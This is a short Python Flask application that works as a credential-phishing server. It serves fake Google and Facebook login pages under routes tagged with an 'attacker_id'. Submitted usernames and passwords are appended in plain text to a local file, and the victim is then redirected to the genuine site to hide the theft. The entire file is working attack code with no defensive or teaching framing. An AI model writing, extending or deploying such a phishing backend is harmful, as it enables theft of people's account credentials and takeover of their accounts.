from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)


def save_credentials(platform, username, password):
    with open("credentials.txt", "a") as f:
        f.write(f"Platform: {platform}, Username: {username}, Password: {password}\n")


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/google-login/<attacker_id>')
def google_login(attacker_id):
    return render_template('google.html', attacker_id=attacker_id)


@app.route('/facebook-login/<attacker_id>')
def facebook_login(attacker_id):
    return render_template('facebook.html', attacker_id=attacker_id)


@app.route('/submit', methods=['POST'])
def submit():
    platform = request.form['platform']
    username = request.form['username']
    password = request.form['password']
    save_credentials(platform, username, password)

    if platform == "Google":
        return redirect("https://accounts.google.com")
    elif platform == "Facebook":
        return redirect("https://facebook.com")
    return "Success"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)